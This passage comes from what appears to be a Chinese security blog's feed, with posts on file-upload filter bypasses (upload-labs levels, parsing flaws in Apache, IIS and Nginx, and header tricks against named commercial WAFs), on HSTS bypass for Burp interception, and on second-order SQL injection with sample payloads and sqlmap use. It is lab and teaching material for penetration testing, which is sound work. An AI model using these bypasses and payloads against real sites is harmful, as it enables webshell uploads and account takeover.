array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);    $file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];    $file_name = deldot($file_name);//删除文件名末尾的点    $file_ext = strrchr($file_name, &apos;.&apos;);    $file_ext = strtolower($file_ext); //转换为小写    $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA    if(!in_array($file_ext, $deny_ext)) {        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];        $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</code></pre><p>同样还是黑名单，但是没有对后缀名去空出来，后缀名加空格绕过</p><p>pass-7（系统特性绕过）       </p><pre><code>$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);$file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);$file_ext = strrchr($file_name, &apos;.&apos;);$file_ext = strtolower($file_ext); //转换为小写$file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA$file_ext = trim($file_ext); //首尾去空if(!in_array($file_ext, $deny_ext)) {    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];    $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</code></pre><p>同样还是黑名单，但是没有对后缀名去 . 处理；由于在windows中会自动去掉后缀名中末尾的 .  , 即在后缀名末尾加 . 可绕过</p><p>pass-8:（系统特性绕过）   </p><pre><code>if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &apos;.&apos;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if(!in_array($file_ext, $deny_ext)) {     $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];     $img_path = UPLOAD_PATH.&apos;/&apos;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;</code></pre><p>同样还是黑名单,但是没有对后缀名进行去”::$DATA”处理，利用windows特性，可在后缀名中加” ::$DATA”绕过</p><p>pass-9:</p><pre><code>$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);    $file_name = deldot($file_name);//删除文件名末尾的点    $file_ext = strrchr($file_name, &apos;.&apos;);    $file_ext = strtolower($file_ext); //转换为小写    $file_ext = str_ireplace(&apos;::$DATA&apos;, &apos;&apos;, $file_ext);//去除字符串::$DATA    $file_ext = trim($file_ext); //首尾去空    if (!in_array($file_ext, $deny_ext)) {        $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];        $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;</code></pre><p>黑名单过滤很全面，但是同样利用windows特性，构造paylaod， shell.php. .  </p><p>pass-10:  </p><pre><code>if (file_exists(UPLOAD_PATH)) {    $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);    $file_name = trim($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);    $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];    $img_path = UPLOAD_PATH.&apos;/&apos;.$file_name;  </code></pre><p>黑名单过滤，将黑名单后缀替换为空，可双写后缀名绕过</p><h1 id="4、白名单后缀名绕过"><a href="#4、白名单后缀名绕过" class="headerlink" title="4、白名单后缀名绕过"></a>4、白名单后缀名绕过</h1><p>pass-11：</p><pre><code>$ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);$file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);if(in_array($file_ext,$ext_arr)){    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];    $img_path = $_GET[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></pre><p>$img_path采用拼接方式，可通过路径名截断绕过，burpsuit抓包，上传shell.png,save_path改成../upload/11.php%00</p><p><img src="1.png" alt=""></p><p>访问<a href="http://127.0.0.1/upload/shell.php" target="_blank" rel="noopener">http://127.0.0.1/upload/shell.php</a></p><p>%00截断利用条件：</p><ol><li>需满足 php 版本&lt;5.3.4</li><li>php.ini中的magic_quotes_gpc是off状态的,受限于addslasheshes函数</li></ol><p>pass-12:    </p><pre><code>$ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);$file_ext = substr($_FILES[&apos;upload_file&apos;][&apos;name&apos;],strrpos($_FILES[&apos;upload_file&apos;][&apos;name&apos;],&quot;.&quot;)+1);if(in_array($file_ext,$ext_arr)){    $temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];    $img_path = $_POST[&apos;save_path&apos;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></pre><p>与pass-11不同的时这里使用POST形式传入save_path,由于POST不能对%00自动解码，需要使用0x00进行绕过</p><p>上传shell.png,save_path改成../upload/11.php+  ; 使用 + 是为了方便定位，一直+ 对应的hex为2b，直接修改2b为00即可</p><p><img src="2.png" alt=""></p><p>访问 <a href="http://127.0.0.1/upload/shell.php" target="_blank" rel="noopener">http://127.0.0.1/upload/shell.php</a></p><p><img src="3.png" alt=""></p><p>其实两个截断的原理都是0x00是字符串的结束标识符，且需要注意的是0x00截断的使用是在路径上！！！！！</p><p>pass-19也同样使用路径拼接的方式，同理，在save_name使用0x00截断即可绕过白名单但是不采取路径拼接的情况下应该考虑,htaccess解析规则和解析漏洞</p><h1 id="5、文件头检查绕过"><a href="#5、文件头检查绕过" class="headerlink" title="5、文件头检查绕过"></a>5、文件头检查绕过</h1><p>pass-13：    </p><pre><code>$file = fopen($filename, &quot;rb&quot;);$bin = fread($file, 2); //只读2字节fclose($file);$strInfo = @unpack(&quot;C2chars&quot;, $bin);    $typeCode = intval($strInfo[&apos;chars1&apos;].$strInfo[&apos;chars2&apos;]);    $fileType = &apos;&apos;;    switch($typeCode){          case 255216:                    $fileType = &apos;jpg&apos;;        break;    case 13780:                    $fileType = &apos;png&apos;;        break;            case 7173:                    $fileType = &apos;gif&apos;;        break;    default:                    $fileType = &apos;unknown&apos;;    }        return $fileType;</code></pre><p>检验文件头，手动添加 GIF89a即可绕过；pass-14 、pass-15同理</p><h1 id="6、条件竞争绕过"><a href="#6、条件竞争绕过" class="headerlink" title="6、条件竞争绕过"></a>6、条件竞争绕过</h1><p>pass-17:     </p><pre><code>   $ext_arr = array(&apos;jpg&apos;,&apos;png&apos;,&apos;gif&apos;);$file_name = $_FILES[&apos;upload_file&apos;][&apos;name&apos;];$temp_file = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];$file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);$upload_file = UPLOAD_PATH . &apos;/&apos; . $file_name;if(move_uploaded_file($temp_file, $upload_file)){    if(in_array($file_ext,$ext_arr)){         $img_path = UPLOAD_PATH . &apos;/&apos;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;         rename($upload_file, $img_path);         $is_upload = true;    }else{        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;        unlink($upload_file);    }</code></pre><p>在if判断之前，已经move_uploaded_file将文件上传到目录中，如果后缀不在白名单内再删除，此时利用竞争条件争在保存文件后删除文件前来执行php文件在burpsuit不断发包，然后网页不断刷新访问</p><p><img src="4.png" alt=""></p><p><img src="5.png" alt=""></p><p>既然能执行命令，那么可以通过执行命令写一个webshell,pass-18同样是条件竞争</p><p>upload_labs:这里面比较<strong>通杀的方法</strong>是采用aaa.php:jpg 的方法生成一个aaa.php的空文件，然后使用aaa.&lt;&lt;&lt;再次写入文件内容。</p><h1 id="7、解析漏洞绕过"><a href="#7、解析漏洞绕过" class="headerlink" title="7、解析漏洞绕过"></a>7、解析漏洞绕过</h1><p><strong>Apache1.X 2.X解析漏洞：</strong><br>Apache在以上版本中，解析文件名的方式是从后向前识别扩展名，直到遇见Apache可识别的扩展名为止。shell.php.jpg  —&gt;被解析为php脚本执行</p><p><strong>IIS6.0中两个解析缺陷</strong>：（iis6.0 默认的可执行文件除了asp还包含这三种asa、cer、cdx） </p><p>目录名包含.asp、.asa、.cer的话，则该目录下的所有文件都将按照asp解析执行     </p><p>xxx.jpg在xxx.asp目录下，xxx.jpg则按照asp解析执行文件名中如果包含.asp;、.asa;、.cer;则优先使用asp解析（这是因为在IIS6.0下，分号后面的不被解析）    xx.asp;.jpg被解析为asp脚本执行</p><p><strong>Nginx解析漏洞</strong>： </p><ul><li>Nginx 0.5.* </li><li>Nginx 0.6.* </li><li>Nginx 0.7 &lt;= 0.7.65 </li><li>Nginx 0.8 &lt;= 0.8.37</li></ul><p>以上Nginx容器的版本下，上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg.php进行请求。</p><p><strong>IIS 7.0/Nginx0.8.41–1.5.6畸形解析漏洞</strong></p><p>上传一个在waf白名单之内扩展名的文件shell.jpg，然后以shell.jpg/.php进行请求。</p><p><strong>PHP CGI解析漏洞：</strong></p><p>IIS 7.0/7.5Nginx &lt; 0.8.3以上的容器版本中默认php配置文件cgi.fix_pathinfo=1时，上传一个存在于白名单的扩展名文件shell.jpg，在请求时以shell.jpg/shell.php请求，会将shell.jpg以php来解析</p><p><strong>多个Content-Disposition：</strong></p><p>在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过</p><h1 id="8、iconv函数限制上传"><a href="#8、iconv函数限制上传" class="headerlink" title="8、iconv函数限制上传"></a>8、iconv函数限制上传</h1><p>在iconv转码的过程中,utf-&gt;gb2312(其他部分编码之间转换同样存在这个问题)会导致字符串被截断，如：</p><p>$filename=”shell.php(hex).jpg”;(hex为0x80-0x99)，经过iconv转码后会变成$filename=”shell.php “;</p><h1 id="9、双文件上传："><a href="#9、双文件上传：" class="headerlink" title="9、双文件上传："></a>9、双文件上传：</h1><p>上传点支持多文件上传，但是却只对第一个文件做了过滤</p><p>f12找到上传的post表单，action属性是指定上传检测页面，补全url: <a href="https://www.xxx.com/xxx.php(asp)，" target="_blank" rel="noopener">https://www.xxx.com/xxx.php(asp)，</a></p><p>然后构造本地post提交表单第一个文件上传正常文件，第二个文件上传我们想要上传的webshell等</p><h1 id="10、waf缺陷绕过"><a href="#10、waf缺陷绕过" class="headerlink" title="10、waf缺陷绕过"></a>10、waf缺陷绕过</h1><p>安全狗4.0：</p><p><strong>文件名回车绕过：（在文件名中插入特殊符号：分号、空格、单引号、换行符）</strong></p><pre><code>filename=&quot;shell.php&quot;或者filename=&quot;shell.php&quot;</code></pre><p><strong>==绕过：（===同样也可以过）</strong></p><pre><code>filename==&quot;shell.php&quot;</code></pre><p><strong>双写filename=;绕过</strong></p><pre><code>filename=;filename=&quot;shell.php&quot;</code></pre><p><strong>%00截断 在文件名后面加上%00然后CTRL+SHIFT+U转成字符，这里后面不用加.jpg也可以</strong></p><pre><code>filename=&quot;shell.php .jpg&quot;</code></pre><p><strong>上传文件的Content-Disposition扩展头字段在filename前插入任意字符长度?=508即可绕过安全狗上传任意后缀</strong></p><p>原因是文件Content-Disposition字段的长度验证不准确</p><pre><code>x*508;filename=&quot;shell.php&quot;</code></pre><p><strong>垃圾字符填充：</strong></p><pre><code>filename=&quot;%20*500+1.php&quot;</code></pre><p><strong>修改头特征：</strong></p><p>去掉form-data</p><pre><code>原：Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;bypass：Content-Disposition: name=&quot;file&quot;; filename=&quot;shell.php&quot;</code></pre><p>(form-data;的意思是内容描述，form-data的意思是来自表单的数据，但是即使不写form-data，apache也接受。)或者更改form-data为一些不相关的值；</p><p>还可以增加额外的头进行干扰</p><pre><code>Content-Type: image/gifContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.php&quot;Content-Type: image/gif</code></pre><p>在http头增加额外字符：</p><pre><code>AAAAAAAA:filename=&quot;secquan.jpg&quot;;Content-Disposition: form-data; name=&quot;file&quot;;  filename=&quot;shell.php&quot;Content-Type: image/gif</code></pre><p><strong>Baidu cloud ：</strong></p><pre><code>filename=&quot;xss.jpg .Php&quot;</code></pre><p><strong>阿里云：</strong></p><p>删掉Content-Type: image/jpeg即可绕过</p><p><strong>云锁：</strong><br>正则的核心在匹配filename后面的值，思路是让它找不到匹配点。</p><pre><code>原：Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;shell.php&quot;bypass：Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=shell.php；</code></pre><p><strong>对于换行等字符的其他应用：</strong></p><p>对filename进行换行</p><pre><code>filename=&quot;shell.php&quot;</code></pre><p>对 = 换行</p><pre><code>filename=&quot;shell.php&quot;</code></pre><p>Tr3jer_CongRong大佬的总结：</p><ol><li>filename在content-type下面</li><li>.asp{80-90}</li><li>NTFS ADS</li><li>.asp…</li><li>boundary不一致（boundary后添加空格）</li><li>iis6分号截断asp.asp;asp.jpg</li><li>apache解析漏洞php.php.ddd</li><li>boundary和content-disposition中间插入换行</li><li>hello.php:a.jpg然后hello.&lt;&lt;&lt;</li><li>filename=php.php</li><li>filename=”a.txt”;filename=”a.php”</li><li>name=\n”file”;filename=”a.php”</li><li>content-disposition:\n</li><li>.htaccess文件</li><li>a.jpg.\nphp</li><li>去掉content-disposition的form-data字段</li><li>php&lt;5.3 单双引号截断特性</li><li>删掉content-disposition: form-data;</li><li>content-disposition\00:</li><li>{char}+content-disposition</li><li>head头的content-type: tab</li><li>head头的content-type: multipart/form-DATA</li><li>filename后缀改为大写</li><li>head头的Content-Type: multipart/form-data;\n</li><li>.asp空格</li><li>.asp0x00.jpg截断</li><li>双boundary</li><li>file\nname=”php.php”</li><li>head头content-type空格:</li><li>form-data字段与name字段交换位置</li></ol><p>链接：<br><a href="https://www.cnblogs.com/-qing-/p/10832850.html" target="_blank" rel="noopener">https://www.cnblogs.com/-qing-/p/10832850.html</a></p><p><a href="https://xz.aliyun.com/t/2435" target="_blank" rel="noopener">https://xz.aliyun.com/t/2435</a></p><p><a href="https://paper.seebug.org/219/" target="_blank" rel="noopener">https://paper.seebug.org/219/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;*&lt;em&gt;上传函数： *&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;move_upload_file()&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;a href=&quot;https://paper.seebug.org/560/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>HSTS bypassing</title>
    <link href="https://github.com/2020/05/21/HSTS-bypassing/"/>
    <id>https://github.com/2020/05/21/HSTS-bypassing/</id>
    <published>2020-05-21T03:05:52.000Z</published>
    <updated>2020-05-21T03:07:41.721Z</updated>
    
    <content type="html"><![CDATA[<p>HSTS：HTTP Strict Transport Security<br>HSTS的作用是强制客户端（如浏览器）使用HTTPS与服务器创建连接。</p><p>firefox+burp绕过方法：</p><p>解决方法1：使用低版本firefox &lt; 3.6.25<br>浏览器的旧版本无法与HSTS标头配合使用，因此会禁用HSTS强制实施</p><p>解决方法2：导入burpsuit证书 </p><p><img src="1.png" alt=""></p><p>解决方法3：忽略HSTS检查</p><p><img src="2.png" alt=""></p><p>命名：test.currentTimeOffsetSeconds<br>value：11491200</p><p>清除history&amp;cache，然后重启浏览器</p><p><img src="3.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;HSTS：HTTP Strict Transport Security&lt;br&gt;HSTS的作用是强制客户端（如浏览器）使用HTTPS与服务器创建连接。&lt;/p&gt;
&lt;p&gt;firefox+burp绕过方法：&lt;/p&gt;
&lt;p&gt;解决方法1：使用低版本firefox &amp;lt; 3.6.25
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>二次注入详解</title>
    <link href="https://github.com/2020/05/19/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/"/>
    <id>https://github.com/2020/05/19/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3/</id>
    <published>2020-05-19T09:33:14.000Z</published>
    <updated>2020-05-19T09:37:56.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01、二次注入原理："><a href="#0x01、二次注入原理：" class="headerlink" title="0x01、二次注入原理："></a>0x01、二次注入原理：</h1><p>用户提交的值未被处理（转义或过滤）就存储在数据库中，而开发人员信任来自数据库的数据，未经处理直接在其他功能中调用</p><h1 id="0x02、二次注入类型："><a href="#0x02、二次注入类型：" class="headerlink" title="0x02、二次注入类型："></a>0x02、二次注入类型：</h1><ul><li>用户提交的值未被处理（转义或过滤）就存储在数据库中，未经处理直接在其他功能中调用。（对应案例1和3）</li><li>用户输入经过addslashes处理，但是数据库在存储过程吃掉 ‘&#39; ;再次调用时触发paylaod且绕过了addslashes等转义处理 。（对应案例2）</li></ul><p>分析几个案例更容易理解；各个案例的源码我会在文末放出</p><h1 id="0x03、案例1：直接以目标用户身份身份登录"><a href="#0x03、案例1：直接以目标用户身份身份登录" class="headerlink" title="0x03、案例1：直接以目标用户身份身份登录"></a>0x03、案例1：直接以目标用户身份身份登录</h1><p>注册时没有经过任何任何处理，payload直接存入数据库；在登录时触发payload以目标（通常为管理员）身份登录</p><p>注册时构造payload：</p><pre><code>用户名：admin&apos; -- -密码：password</code></pre><p>登录处验证代码：</p><pre><code>if($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;){// Check if username is emptyif(empty(trim($_POST[&quot;username&quot;]))){    $username_err = &apos;Please enter username.&apos;;} else{    $username = trim($_POST[&quot;username&quot;]);}// Check if password is emptyif(empty(trim($_POST[&apos;password&apos;]))){    $password_err = &apos;Please enter your password.&apos;;} else{    $password = trim($_POST[&apos;password&apos;]);}####对用户输入没有进行特殊处理if(empty(trim($_POST[&quot;username&quot;]))){$username_err = &apos;Please enter username.&apos;;} else{    $username = trim($_POST[&quot;username&quot;]);  }// Check if password is emptyif(empty(trim($_POST[&apos;password&apos;]))){    $password_err = &apos;Please enter your password.&apos;;} else{    $password = trim($_POST[&apos;password&apos;]);}// Validate credentialsif(empty($username_err) &amp;&amp; empty($password_err)){    // Prepare a select statement    $sql = &quot;SELECT username, password FROM users WHERE username = ?&quot;;####此时将用户名和密码从数据库中取出----&gt;触发构造的payload  ##SQL语句为：SELECT username, password FROM users WHERE username = &apos;admin&apos; -- - ##也就是取出admin账户的账户密码来做验证；所以后边的代码可以不用看都没事       if($stmt = mysqli_prepare($link, $sql)){        // Bind variables to the prepared statement as parameters        mysqli_stmt_bind_param($stmt, &quot;s&quot;, $param_username);。###在传递给mysqli_prepare()的SQL语句中为参数标记绑定变量为用户输入        // Set parameters        $param_username = $username;        // Attempt to execute the prepared statement        if(mysqli_stmt_execute($stmt)){            // Store result            mysqli_stmt_store_result($stmt);     ###获取$sql执行结果                          // Check if username exists, if yes then verify password            if(mysqli_stmt_num_rows($stmt) == 1){     ####结果集中行数等于1,即用户存在                               // Bind result variables                mysqli_stmt_bind_result($stmt, $username, $hashed_password); ###将结果集中的列绑定到变量。                if(mysqli_stmt_fetch($stmt)){  ###从准备好的语句中获取结果到mysqli_stmt_bind_result()绑定的变量中 。                    if(password_verify($password, $hashed_password)){                        /* Password is correct, so start a new session and                        save the username to the session */                        session_start();                        $_SESSION[&apos;username&apos;] = $username;                              header(&quot;location: home.php&quot;);                    } else{                        // Display an error message if password is not valid                        $password_err = &apos;The password you entered was not valid.&apos;;                    }                }            } else{                // Display an error message if username doesn&apos;t exist                $username_err = &apos;No account found with that username.&apos;;            }        } else{            echo &quot;Oops! Something went wrong. Please try again later.&quot;;        }    }</code></pre><h1 id="0x04、案例2：经典案例sqli-labs-24，更改管理账户密码"><a href="#0x04、案例2：经典案例sqli-labs-24，更改管理账户密码" class="headerlink" title="0x04、案例2：经典案例sqli-labs-24，更改管理账户密码"></a>0x04、案例2：经典案例sqli-labs-24，更改管理账户密码</h1><p>在注册时构造payload</p><pre><code>用户名： admin&apos; #密码：password</code></pre><p>注册时对用户输入的注册用户名进行特殊字符转义</p><pre><code>$username=  mysql_escape_string($_POST[&apos;username&apos;]) ;$pass= mysql_escape_string($_POST[&apos;password&apos;]);$re_pass= mysql_escape_string($_POST[&apos;re_password&apos;]);....###此时payload被转义为admin\&apos;\ #...$sql = &quot;insert into users ( username, password) values(\&quot;$username\&quot;, \&quot;$pass\&quot;)&quot;;mysql_query($sql) or die(&apos;Error Creating your user account,  : &apos;.mysql_error());...##存入数据库后payload被还原为: admin&apos; #</code></pre><p>也就是转义会被数据库吃掉，在被引用时还原为我们的paylaod；原理如下图</p><p><img src="1.png" alt=""></p><p>登录时同样对用户输入进行特殊字符转义（没有进行特殊处理的话即会变成案例1）</p><pre><code>function sqllogin(){   $username = mysql_real_escape_string($_POST[&quot;login_user&quot;]);   $password = mysql_real_escape_string($_POST[&quot;login_password&quot;]);   $sql = &quot;SELECT * FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;   $res = mysql_query($sql) or die(&apos;You tried to be real smart, Try harder!!!! :( &apos;);   $row = mysql_fetch_row($res);//print_r($row) ;   if ($row[1]) {return $row[1];   } else {  return 0;   }}</code></pre><p>简单验证一下注册和登录流程：</p><p><img src="1.png" alt=""></p><p>更改密码：</p><pre><code>$sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;####直接获取当前用户名进行密码更新###此时SQL语句： UPDATE users SET PASSWORD=&apos;password&apos; where username=&apos;admin&apos;#&apos; and password=&apos;$curr_pass&apos;$res = mysql_query($sql) or die(&apos;You tried to be smart, Try harder!!!! :( &apos;);........</code></pre><p>至此完成二次注入对目标用户密码的修改</p><h1 id="0x05、案例3：二次注入中的数据查询（利用SQLMAP脚本进行二次注入）"><a href="#0x05、案例3：二次注入中的数据查询（利用SQLMAP脚本进行二次注入）" class="headerlink" title="0x05、案例3：二次注入中的数据查询（利用SQLMAP脚本进行二次注入）"></a>0x05、案例3：二次注入中的数据查询（利用SQLMAP脚本进行二次注入）</h1><p> 以HTB的NightMare靶机为例：</p><p>注册帐户名 ： ’</p><p>登录进入发现SQL报错</p><p><img src="3.png" alt=""></p><p>初步验证注入点 ，在BurpSuit分别抓注册和登录包发送到Repeater；来回切换</p><pre><code>&apos; -- -  仍然报错；寻找正确闭合方式&quot; -- - 回显SQL报错信息&apos;) -- -无SQL报错信息1&apos;) or 1=1 #无SQL报错信息&apos;) order by 1000#   回显SQL报错信息&apos;) order by 1#  无SQL报错信息.....###最终验证出列值为 2 </code></pre><p><strong>使用SQLMAP进行POST二次注入；</strong><br>编写对应tamper脚本简易思路：（难点是注册之后基于新cookie进行身份验证）<br>我在这里找到了对应的技巧：将HTTP请求发送到主页并检索新的cookie值；将sqlmap生成HTTP请求替换Cookie值 </p><p><a href="https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/" target="_blank" rel="noopener">https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/</a></p><p><a href="https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5" target="_blank" rel="noopener">https://medium.com/@lethanhphuc.pk/second-order-sql-injection-explained-with-example-f67fb199f5e5</a></p><p>注册：register username位置填入 payload ;密码固定password=123456    </p><p>post_data = { ‘username’:payload, ‘password’:’tw123’,’register’:’Register’ }</p><p>然后是获取用户注册成功后返回的cookie并执行替换；使用–second-url  <a href="http://10.10.10.66/notes.php" 